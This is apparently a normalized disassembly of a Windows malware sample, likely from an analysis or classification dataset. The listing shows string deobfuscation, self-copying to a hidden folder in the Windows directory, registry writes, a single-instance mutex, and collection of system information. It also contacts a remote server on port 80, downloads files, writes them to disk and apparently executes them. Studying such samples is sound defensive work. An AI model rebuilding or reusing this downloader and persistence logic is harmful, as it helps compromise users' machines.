sub_401000
mov eax sub_405fc4
call _EH_prolog
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_401067
test eax eax
jne r-xdata
call sub_402768
call [ WSACleanup@IAT ]
xor eax eax
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_401047
xor ecx ecx
cmp [ esp + 0x8 ] ecx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
add eax ecx
mov dl [ eax ]
xor dl 0x11
sub dl 0x25
inc ecx
cmp ecx [ esp + 0x8 ]
mov [ eax ] dl
jl r-xdata
sub_401067
push ecx
push ecx
push ebx
push esi
mov esi [ LoadLibraryA@IAT ]
push edi
push rw-data
call esi
mov ebx [ GetProcAddress@IAT ]
mov edi eax
push rw-data
push edi
call ebx
push edi
mov edi [ FreeLibrary@IAT ]
mov [ rw-data ] eax
call edi
push rw-data
call esi
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push rw-data
push esi
call ebx
push esi
mov [ rw-data ] eax
call edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
retn
push ebp
push 0x8
pop esi
push esi
push rw-data
call sub_401047
push 0x20
push rw-data
call sub_401047
push 0x24
push rw-data
call sub_401047
push 0x3f
push rw-data
call sub_401047
push 0xb
push rw-data
call sub_401047
push 0xd
push rw-data
call sub_401047
push 0x11
push rw-data
call sub_401047
push 0x10
push rw-data
call sub_401047
add esp 0x40
push 0xc
push rw-data
call sub_401047
push 0x16
push rw-data
call sub_401047
push 0xb
push rw-data
call sub_401047
push esi
push rw-data
call sub_401047
push esi
push rw-data
call sub_401047
push esi
push rw-data
call sub_401047
push 0xa
push rw-data
call sub_401047
push 0xd
push rw-data
call sub_401047
add esp 0x40
push esi
push rw-data
call sub_401047
push 0xf
push rw-data
call sub_401047
push 0xe
push rw-data
call sub_401047
push 0xe
push rw-data
call sub_401047
push rw-data
call strlen
push 0x7
pop ebx
sub eax ebx
push eax
push rw-data
call sub_401047
push rw-data
call strlen
sub eax ebx
push eax
push rw-data
call sub_401047
push rw-data
call strlen
sub eax ebx
mov edi rw-data
push eax
push edi
call sub_401047
add esp 0x44
push rw-data
call strlen
sub eax ebx
mov esi rw-data
push eax
push esi
call sub_401047
push rw-data
call strlen
sub eax ebx
mov ebp rw-data
push eax
push ebp
call sub_401047
push rw-data
call strlen
sub eax ebx
mov ebx rw-data
push eax
push ebx
call sub_401047
push 0x16
push rw-data
call sub_401047
push 0xb
push rw-data
call sub_401047
push 0xb
push rw-data
call sub_401047
push 0xc
push rw-data
call sub_401047
add esp 0x44
push 0x13
push rw-data
call sub_401047
push 0xd
push rw-data
call sub_401047
push 0x12
push rw-data
call sub_401047
push 0xa
push rw-data
call sub_401047
push 0x9
push rw-data
call sub_401047
push 0xd
push rw-data
call sub_401047
add esp 0x30
mov [ esp + 0x10 ] rw-data
push [ esp + 0x10 ]
call strlen
push eax
push [ esp + 0x18 ]
call sub_401047
add [ esp + 0x1c ] 0x10
add esp 0xc
cmp [ esp + 0x10 ] rw-data
jl r-xdata
push rw-data
push rw-data
call strcpy
push rw-data
push rw-data
call strcpy
push edi
push rw-data
call strcpy
mov edi rw-data
push esi
push edi
call strcpy
push ebp
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push ebx
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
add esp 0x40
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
add esp 0x40
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
push esi
mov esi rw-data
push esi
call strcpy
add esp 0x40
push rw-data
push esi
call strcat
pop ecx
pop ecx
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
xor ebx ebx
cmp esi ebx
pop ebp
je r-xdata
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov edi eax
call [ FreeLibrary@IAT ]
cmp edi ebx
je r-xdata
push rw-data
push ebx
push ebx
push ebx
call edi
push rw-data
push ebx
push ebx
push ebx
mov [ rw-data ] eax
call edi
push rw-data
push ebx
push ebx
push ebx
mov [ rw-data ] eax
call edi
mov [ rw-data ] eax
call sub_4015e6
test eax eax
je r-xdata
push rw-data
call sub_401ab8
call sub_401af6
neg eax
sbb eax eax
push ebx
neg eax
mov [ rw-data ] eax
call sub_401605
call sub_40181e
call sub_402ab8
call sub_402266
call sub_40254b
call sub_402622
call sub_401513
mov esi [ malloc@IAT ]
mov edi 0x2000
push edi
call esi
add esp 0xc
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push edi
call esi
cmp eax ebx
pop ecx
mov [ rw-data ] eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push ebx
push ebx
push sub_402f4c
push ebx
push ebx
call [ CreateThread@IAT ]
push 0x1
pop eax
sub_401513
push ebp
mov ebp esp
sub esp 0x200
push esi
mov esi 0x100
lea eax [ ebp - 0x200 ]
push esi
push eax
push 0x0
call [ rw-data ]
lea eax [ ebp - 0x100 ]
push esi
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x100 ]
pop ecx
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x100 ]
push eax
call [ GetFileAttributesA@IAT ]
mov esi [ SetFileAttributesA@IAT ]
or al 0x2
push eax
lea eax [ ebp - 0x100 ]
push eax
call esi
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x200 ]
pop ecx
push 0x0
push eax
call esi
lea eax [ ebp - 0x100 ]
push 0x0
push eax
lea eax [ ebp - 0x200 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x200 ]
push eax
call sub_404b7c
pop ecx
pop esi
leave
retn
sub_4015c5
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call [ CreateDirectoryA@IAT ]
push esi
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
push esi
call [ SetFileAttributesA@IAT ]
pop esi
retn
sub_401605
push ebp
mov ebp esp
sub esp 0x288
push ebx
push esi
xor ebx ebx
push edi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
mov [ ebp - 0x8 ] 0x80
xor esi esi
call [ RegCreateKeyExA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x288 ]
push 0x200
push eax
push ebx
call [ rw-data ]
lea eax [ ebp - 0x288 ]
push 0x5c
push eax
call [ strrchr@IAT ]
mov esi eax
inc esi
push esi
push rw-data
call strcpy
mov cl [ esi ]
add esp 0x10
cmp cl bl
mov [ ebp + 0x8 ] ebx
je r-xdata
mov al [ ebp - 0x88 ]
mov eax [ ebp + 0x8 ]
push [ ebp - 0x8 ]
mov [ ebp + eax - 0x88 ] bl
lea eax [ ebp - 0x88 ]
push eax
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
lea edi [ ebp - 0x88 ]
mov eax esi
sub edi esi
cmp [ ebp + 0x8 ] ebx
mov [ esi + rw-data ] bl
je r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ ebp + esi - 0x87 ]
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
pop edi
pop esi
pop ebx
je r-xdata
push ebx
call [ time@IAT ]
push eax
call [ srand@IAT ]
pop ecx
pop ecx
call [ rand@IAT ]
push 0x4
push edi
push 0x4
push ebx
push esi
mov [ rw-data ] eax
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
inc cl
inc [ ebp + 0x8 ]
mov [ edi + eax ] cl
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edi rw-data
push eax
push edi
push ebx
mov esi rw-data
push ebx
push esi
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
cmp al bl
je r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_40175c
push ebp
mov ebp esp
sub esp 0x204
push esi
lea eax [ ebp - 0x204 ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x201 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
add esp 0x20
xor esi esi
lea eax [ ebp - 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000001
call [ RegCreateKeyExA@IAT ]
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] esi
pop esi
je r-xdata
lea eax [ ebp - 0x204 ]
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x204 ]
push eax
push 0x1
push [ ebp + 0x8 ]
push esi
push [ ebp - 0x4 ]
call [ SHSetValueA@IAT ]
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_40181e
push ebp
mov ebp esp
sub esp 0x700
push ebx
push esi
mov esi rw-data
push edi
xor ebx ebx
push esi
push ebx
push 0x1f0001
call [ OpenMutexA@IAT ]
cmp eax ebx
je r-xdata
push esi
push ebx
push ebx
call [ CreateMutexA@IAT ]
mov esi [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call esi
lea eax [ ebp - 0x1fd ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
mov edi rw-data
lea eax [ ebp - 0x200 ]
push edi
push eax
call strcat
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
add esp 0x20
lea eax [ ebp - 0x200 ]
push ebx
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x200 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x700 ]
push 0x400
push eax
push ebx
call [ rw-data ]
mov [ ebp + eax - 0x700 ] bl
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call esi
lea eax [ ebp - 0x1fd ]
push rw-data
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x200 ]
pop ecx
push ebx
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push eax
call sub_4015c5
lea eax [ ebp - 0x200 ]
push edi
push eax
call strcat
mov edi rw-data
lea eax [ ebp - 0x200 ]
push edi
push eax
call strcat
mov esi [ strrchr@IAT ]
lea eax [ ebp - 0x200 ]
push 0x2e
push eax
call esi
mov [ eax ] bl
lea eax [ ebp - 0x700 ]
push 0x2e
push eax
call esi
add esp 0x2c
mov [ eax ] bl
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0x700 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov edi rw-data
push edi
push rw-data
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push 0x1
push edi
call sub_40175c
push 0x1
call sub_401605
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
call sub_403338
lea eax [ ebp - 0x700 ]
push rw-data
push eax
call strcat
mov esi [ SetFileAttributesA@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x200 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x200 ]
push ebx
push eax
lea eax [ ebp - 0x700 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0x300 ]
push eax
call strcpy
lea eax [ ebp - 0x300 ]
push rw-data
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x300 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x300 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x300 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call [ rename@IAT ]
lea eax [ ebp - 0x200 ]
push eax
call sub_404b7c
lea eax [ ebp - 0x200 ]
push eax
call sub_405509
add esp 0x10
push 0x1
call [ ExitProcess@IAT ]
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x1388
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
push ebx
push rw-data
call sub_40175c
pop ecx
pop ecx
push edi
push rw-data
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push 0x1
call [ ExitProcess@IAT ]
sub_401ab8
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi 0x9c
push edi
push 0x0
push esi
call memset
add esp 0xc
mov [ esi ] edi
mov edi [ GetVersionExA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
pop edi
mov [ rw-data ] ax
pop esi
retn
push esi
mov [ esi ] 0x94
call edi
sub_401af6
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
xor ebx ebx
push 0x1
push ebx
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
push eax
push rw-data
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x100
call esi
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp edi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ strstr@IAT ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
lea edi [ ebp - 0x108 ]
add edi 0x5
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3a
push edi
call [ strchr@IAT ]
mov esi eax
push edi
push rw-data
mov [ esi ] bl
call strcpy
inc esi
push esi
call [ atoi@IAT ]
add esp 0x14
mov [ rw-data ] eax
push 0x1
pop eax
jmp r-xdata
sub_401bd9
push ebp
mov ebp esp
mov eax 0x2128
call sub_405de0
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_402b2b
mov edi [ inet_addr@IAT ]
pop ecx
push eax
call edi
xor ebx ebx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x2
mov [ ebp - 0x10 ] eax
call [ socket@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0x1
push eax
push 0x8004667e
push esi
call [ ioctlsocket@IAT ]
cmp [ rw-data ] ebx
mov [ ebp - 0x8 ] 0x3c
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x128 ] 0x1
je r-xdata
mov edi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
push rw-data
call edi
mov edi eax
mov eax [ rw-data ]
jmp r-xdata
push esi
call [ closesocket@IAT ]
mov eax ebx
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2128 ]
push [ ebp + 0x24 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4028dc
lea eax [ ebp - 0x2128 ]
push eax
call strlen
push [ ebp + 0x18 ]
mov edi eax
push [ ebp + 0x14 ]
lea eax [ ebp + edi - 0x2128 ]
push eax
call memcpy
mov eax [ ebp + 0x18 ]
add esp 0x28
add edi eax
lea eax [ ebp - 0x2128 ]
push ebx
push edi
push eax
push esi
call [ rw-data ]
cmp [ ebp + 0x24 ] 0x1
jne r-xdata
push eax
mov [ ebp - 0x24 ] 0x2
call [ htons@IAT ]
mov [ ebp - 0x22 ] ax
lea eax [ ebp - 0x24 ]
push 0x10
push eax
push esi
mov [ ebp - 0x20 ] edi
call [ connect@IAT ]
lea ecx [ ebp - 0x8 ]
lea eax [ esi + 0x1 ]
push ecx
lea ecx [ ebp - 0x128 ]
push ebx
push ecx
push ebx
push eax
call [ select@IAT ]
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_4029dd
cmp eax 0xffffffff
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x128 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push ebx
push eax
call [ select@IAT ]
test eax eax
jle r-xdata
push esi
call [ closesocket@IAT ]
cmp eax 0x3e800
jge r-xdata
push 0x1
pop ebx
xor edi edi
mov eax 0x3e800
push ebx
sub eax edi
push eax
mov eax [ ebp + 0x1c ]
add eax edi
push eax
push esi
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp eax ebx
je r-xdata
push esi
call [ closesocket@IAT ]
mov eax [ ebp + 0x20 ]
push 0x1
mov [ eax ] edi
pop eax
jmp r-xdata
add edi eax
cmp edi 0x3e800
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
lea eax [ ebp - 0x128 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push eax
call [ select@IAT ]
test eax eax
jle r-xdata
sub_401da2
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ esp + 0x8 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401bd9
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
mov eax [ esi ]
push 0x1
mov [ rw-data ] eax
pop edi
pop edi
pop esi
pop ecx
retn
sub_401dfa
push ebp
mov ebp esp
sub esp 0x58c
push esi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov [ ebp - 0x4 ] eax
call [ FreeLibrary@IAT ]
push 0x3e800
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
je r-xdata
pop esi
leave
retn
push ebx
mov esi rw-data
push edi
lea eax [ ebp - 0x58c ]
push esi
push eax
call strcpy
push esi
call strlen
mov ebx eax
mov esi rw-data
inc ebx
push esi
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
push esi
call strlen
lea ebx [ ebx + eax + 0x1 ]
mov esi 0x9c
push esi
push rw-data
lea eax [ ebp + ebx - 0x58c ]
push eax
call memcpy
mov ax [ rw-data ]
add ebx esi
mov edx [ rw-data ]
mov esi rw-data
lea edi [ ebp - 0x18c ]
add esp 0x24
movsd [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] ax
inc ebx
movsd [ edi ] [ esi ]
inc ebx
push 0x1d
test edx edx
setne al
movsw [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] al
mov eax [ rw-data ]
inc ebx
pop ecx
movsb [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] eax
xor eax eax
lea edi [ ebp - 0x181 ]
mov esi [ sprintf@IAT ]
[ edi ]
add ebx 0x4
test edx edx
stosb [ edi ]
je r-xdata
lea eax [ ebp - 0x18c ]
push eax
push rw-data
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push eax
call strlen
add esp 0x1c
lea ebx [ ebx + eax + 0x1 ]
call [ ebp - 0x4 ]
mov ecx 0x36ee80
xor edx edx
mov edi ecx
mov [ ebp - 0x4 ] eax
div edi
mov edi 0xea60
mov eax edx
xor edx edx
div edi
xor edx edx
push eax
mov eax [ ebp - 0x4 ]
div ecx
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push eax
call strlen
lea esi [ ebx + eax + 0x1 ]
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push 0x2f
push eax
call [ strrchr@IAT ]
mov edi rw-data
lea ebx [ ebp + esi - 0x58c ]
push edi
push ebx
mov [ ebp - 0x4 ] eax
call strcpy
mov eax [ ebp - 0x4 ]
add esp 0x34
test eax eax
je r-xdata
push [ rw-data ]
lea eax [ ebp - 0x18c ]
push rw-data
push rw-data
push eax
call esi
add esp 0x10
lea eax [ ebp - 0xc ]
push 0x1
push eax
lea eax [ ebp - 0x58c ]
push [ ebp - 0x8 ]
push esi
push eax
push rw-data
push 0x50
push [ rw-data ]
call [ inet_ntoa@IAT ]
push eax
call sub_401bd9
push [ ebp - 0x8 ]
mov esi eax
call [ free@IAT ]
add esp 0x24
mov eax esi
pop edi
pop ebx
and [ eax ] 0x0
lea eax [ ebp - 0x10c ]
push eax
push ebx
call strcat
push edi
call strlen
mov edi eax
lea eax [ ebp - 0x10c ]
push eax
call strlen
add esp 0x10
add eax esi
lea esi [ eax + edi + 0x2 ]
sub_40204f
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401bd9
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
push [ ebp - 0x4 ]
push esi
call sub_4020ac
pop ecx
mov edi eax
pop ecx
pop edi
pop esi
leave
retn
sub_4020ac
push ebx
xor ebx ebx
cmp [ esp + 0xc ] ebx
push esi
push edi
jle r-xdata
xor eax eax
mov edi [ esp + 0x10 ]
mov esi rw-data
push esi
call strlen
pop ecx
add eax ebx
mov eax [ eax + edi + 0x1 ]
xor ecx ecx
cmp eax [ rw-data ]
sete cl
mov eax ecx
jmp r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + edi ]
push esi
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
sub_4020f9
push ebx
push ebp
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov ebp eax
call [ FreeLibrary@IAT ]
mov edi [ esp + 0x18 ]
xor ebx ebx
lea esi [ edi + edi * 4 + 0x3a98 ]
shl esi 0x1
call ebp
xor ebp ebp
mov [ rw-data ] eax
cmp edi ebp
jle r-xdata
push 0x1
pop eax
cmp [ rw-data ] ebp
jne r-xdata
xor eax eax
jmp r-xdata
mov eax edi
push ebp
sub eax ebx
push eax
mov eax [ esp + 0x1c ]
add eax ebx
push eax
push [ rw-data ]
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
add ebx eax
mov eax edi
sub eax ebx
add eax 0xbb8
lea esi [ eax + eax * 4 ]
shl esi 0x1
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
mov [ rw-data ] ebp
push 0x1
call [ Sleep@IAT ]
mov eax esi
dec esi
test eax eax
je r-xdata
jmp r-xdata
cmp ebx edi
jl r-xdata
sub_4021a5
push ebp
mov ebp esp
sub esp 0x200
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ esi ] 0x41
je r-xdata
push 0x200
lea eax [ ebp - 0x200 ]
push ebx
push eax
call memset
add esp 0xc
push [ esi + 0x1 ]
push 0x1
push rw-data
push 0x51
push [ rw-data ]
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_4028dc
lea eax [ ebp - 0x200 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_4020f9
add esp 0x24
test eax eax
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push esi
call sub_4020f9
pop ecx
pop ecx
xor eax eax
jmp r-xdata
push [ rw-data ]
mov [ rw-data ] 0x1
mov [ rw-data ] ebx
call [ closesocket@IAT ]
pop esi
pop ebx
leave
retn
call sub_402b4a
test eax eax
je r-xdata
push 0x1
call [ Sleep@IAT ]
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
sub_402266
push ecx
push edi
push 0x3e800
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
pop ecx
retn
push esi
lea eax [ esp + 0x8 ]
push 0x0
push eax
push edi
push 0x0
push rw-data
push rw-data
mov esi rw-data
push 0x50
push esi
call sub_401bd9
add esp 0x20
test eax eax
je r-xdata
push edi
call [ free@IAT ]
pop ecx
pop esi
push esi
push rw-data
call strcpy
pop ecx
pop ecx
sub_4022bc
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push 0x3e800
call [ malloc@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
push esi
push edi
lea ecx [ ebp - 0x8 ]
push ebx
push ecx
push eax
mov edi rw-data
push ebx
push edi
push rw-data
mov esi rw-data
push 0x50
push esi
call sub_401bd9
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
pop edi
mov eax ebx
pop esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
push rw-data
push eax
mov [ ecx + eax ] bl
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push ebx
push eax
push [ ebp - 0x4 ]
push ebx
push edi
push rw-data
push 0x50
push esi
call sub_401bd9
add esp 0x20
test eax eax
je r-xdata
lea eax [ ebp - 0x40c ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x40c ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x40c ]
pop ecx
push ebx
push 0x2
push 0x2
push ebx
push ebx
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push esi
call [ WriteFile@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x40c ]
push eax
call sub_405509
pop ecx
push 0x1
pop ebx
sub_4023cf
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor ebx ebx
cmp esi ebx
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
push ebx
push eax
push esi
mov edi rw-data
push ebx
push edi
push rw-data
push 0x50
push rw-data
call sub_401bd9
add esp 0x20
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
call [ free@IAT ]
pop ecx
mov eax ebx
mov eax [ ebp - 0x4 ]
push rw-data
push esi
mov [ eax + esi ] bl
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x4 ]
push ebx
push eax
push esi
push ebx
push edi
push rw-data
push 0x50
push rw-data
call sub_401bd9
add esp 0x20
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edi [ esi - 0x2 ]
mov [ eax + esi ] bl
cmp edi ebx
je r-xdata
add edi 0x2
push 0xd
push edi
mov [ ebp - 0x8 ] edi
call [ strchr@IAT ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
push rw-data
push [ ebp - 0x8 ]
call strcmp
pop ecx
test eax eax
pop ecx
jne r-xdata
mov [ edi ] bl
mov eax [ ebp - 0x4 ]
add eax esi
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x4 ]
push ebx
push eax
push esi
push ebx
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401bd9
add esp 0x20
test eax eax
je r-xdata
lea eax [ ebp - 0x40c ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x40c ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x40c ]
pop ecx
push ebx
push 0x2
push 0x2
push ebx
push ebx
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
push [ ebp - 0x4 ]
push esi
push edi
call [ WriteFile@IAT ]
push edi
mov [ ebp - 0x8 ] eax
call [ CloseHandle@IAT ]
cmp [ ebp - 0x8 ] ebx
je r-xdata
